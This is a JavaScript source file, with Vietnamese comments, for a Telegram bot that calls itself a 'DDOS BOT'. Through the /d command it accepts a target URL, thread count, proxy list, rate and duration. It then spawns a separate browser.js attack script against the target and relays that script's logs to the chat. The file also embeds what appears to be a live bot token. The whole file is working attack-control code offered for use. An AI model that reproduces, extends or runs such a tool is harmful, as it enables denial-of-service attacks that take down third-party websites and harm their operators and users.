// bot.js - ĐÃ SỬA ĐỂ IN LOG TỪ browser.js
const { Telegraf } = require('telegraf');
const { spawn } = require('child_process');
const fs = require('fs');

const TOKEN = '7580314584:AAFLRinlnilclZpQgXt4fc5uKu2YSUwxH4k'; // ĐỔI TOKEN
const DEFAULT_PROXY = 'proxy1.txt';
const bot = new Telegraf(TOKEN);

let isRunning = false;

// === /start ===
bot.start((ctx) => {
    ctx.replyWithMarkdown(`
*DDOS BOT*

\`/d <url> <luồng> [proxy.txt] [rate] <giây>\`

*Ví dụ:*
\`/d https://example.com 10 50 60\`
    `);
});

// === /d ===
bot.command('d', (ctx) => {
    if (isRunning) return ctx.reply('Đang chạy!');

    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 3) return ctx.reply('Sai! Ví dụ: `/d url 10 50 60`');

    let url = args[0];
    let threads = null;
    let rate = '100';
    let time = args[args.length - 1];
    let proxyFile = DEFAULT_PROXY;

    for (let i = 1; i < args.length - 1; i++) {
        if (!isNaN(args[i]) && args[i] > 0 && !threads) threads = args[i];
        else if (args[i].endsWith('.txt') && fs.existsSync(args[i])) proxyFile = args[i];
        else if (!isNaN(args[i])) rate = args[i];
    }

    if (!threads) return ctx.reply('Thiếu luồng!');
    if (!url.match(/^https?:\/\//)) return ctx.reply('URL sai');
    if (threads > 50) return ctx.reply('Luồng ≤ 50');
    if (time < 10) return ctx.reply('Thời gian ≥ 10s');
    if (rate > 1000) return ctx.reply('Rate ≤ 1000');
    if (!fs.existsSync(proxyFile)) return ctx.reply('Không thấy proxy file');

    ctx.replyWithMarkdown(`
*Khởi chạy...*
URL: \`${url}\`
Luồng: \`${threads}\`
Proxy: \`${proxyFile}\`
Rate: \`${rate}\`
Thời gian: \`${time}s\`
    `);

    // === CHẠY browser.js VÀ IN LOG ===
    const child = spawn('node', ['browser.js', url, threads, proxyFile, rate, time], {
        detached: true,
        stdio: ['ignore', 'pipe', 'pipe']
    });

    child.stdout.on('data', (data) => {
        const log = data.toString().trim();
        console.log(`[browser.js] ${log}`);
        ctx.reply(`[LOG] ${log}`).catch(() => {});
    });

    child.stderr.on('data', (data) => {
        const err = data.toString().trim();
        console.error(`[LỖI] ${err}`);
        ctx.reply(`[LỖI] ${err}`).catch(() => {});
    });

    child.on('error', (err) => {
        console.error(`[SPAWN] ${err.message}`);
    });

    child.unref();
    isRunning = true;

    setTimeout(() => {
        if (isRunning) {
            ctx.reply('*Kết thúc.*');
            isRunning = false;
        }
    }, (parseInt(time) + 10) * 1000);
});

// === /stop ===
bot.command('stop', (ctx) => {
    if (!isRunning) return ctx.reply('Không chạy.');
    require('child_process').exec('pkill -f browser.js || taskkill /f /im node.exe 2>nul');
    isRunning = false;
    ctx.reply('*ĐÃ DỪNG!*');
});

// === KHỞI ĐỘNG ===
bot.launch();
console.log('Bot chạy...');
